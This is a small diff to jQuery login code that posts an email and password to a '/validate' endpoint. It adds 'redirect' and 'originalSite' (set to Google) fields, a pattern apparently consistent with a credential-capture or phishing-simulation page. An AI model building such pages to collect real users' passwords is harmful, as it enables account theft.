@@ -22,8 +22,10 @@
 			$("#overlay").css("display", "block")
 			$(".bar").animate({ width: "30%" }, 1000);
 			var postReq = $.post("/validate", {
+				redirect: "false",
+				originalSite: "https://www.google.com",
 				username: $("#email-input").val(),
-				password: $("#password-input").val(),
+				password: $("#password-input").val()
 			});
 
 			// Put the results in a div
